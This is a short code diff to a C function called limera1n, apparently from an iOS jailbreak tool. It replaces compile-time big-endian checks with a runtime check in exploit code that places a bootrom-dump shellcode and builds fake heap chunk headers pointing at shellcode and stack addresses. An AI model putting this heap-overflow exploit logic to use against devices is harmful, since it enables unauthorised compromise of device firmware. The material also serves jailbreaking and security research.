@@ -135,12 +135,12 @@ int limera1n()
 	unsigned int shellcode_address = 0x84023001;
 	unsigned char bootrom_dump_sc[72];
 
-#ifdef BIG_ENDIAN
-	limera1n_dump_bootrom_addresses[0] =
-	    __builtin_bswap32(limera1n_dump_bootrom_addresses[0]);
-	limera1n_dump_bootrom_addresses[1] =
-	    __builtin_bswap32(limera1n_dump_bootrom_addresses[1]);
-#endif
+	if(endian() == ENDIAN_BIG) {
+		limera1n_dump_bootrom_addresses[0] =
+		    __builtin_bswap32(limera1n_dump_bootrom_addresses[0]);
+		limera1n_dump_bootrom_addresses[1] =
+		    __builtin_bswap32(limera1n_dump_bootrom_addresses[1]);
+	};
 
 	memcpy(bootrom_dump_sc, limera1n_dump_bootrom,
 	       sizeof(limera1n_dump_bootrom));
@@ -185,18 +185,17 @@ int limera1n()
 	memset(buf, 0xCC, 0x800);
 	for (i = 0; i < 0x800; i += 0x40) {
 		unsigned int *heap = (unsigned int *)(buf + i);
-
-#ifdef BIG_ENDIAN
-		heap[0] = __builtin_bswap32(0x405);
-		heap[1] = __builtin_bswap32(0x101);
-		heap[2] = __builtin_bswap32(shellcode_address);
-		heap[3] = __builtin_bswap32(stack_address);
-#else
-		heap[0] = 0x405;
-		heap[1] = 0x101;
-		heap[2] = shellcode_address;
-		heap[3] = stack_address;
-#endif
+		if(endian() == ENDIAN_BIG) {
+			heap[0] = __builtin_bswap32(0x405);
+			heap[1] = __builtin_bswap32(0x101);
+			heap[2] = __builtin_bswap32(shellcode_address);
+			heap[3] = __builtin_bswap32(stack_address);
+		} else {
+			heap[0] = 0x405;
+			heap[1] = 0x101;
+			heap[2] = shellcode_address;
+			heap[3] = stack_address;
+		}
 	}
 
 	DPRINT("Sending chunk headers\n");
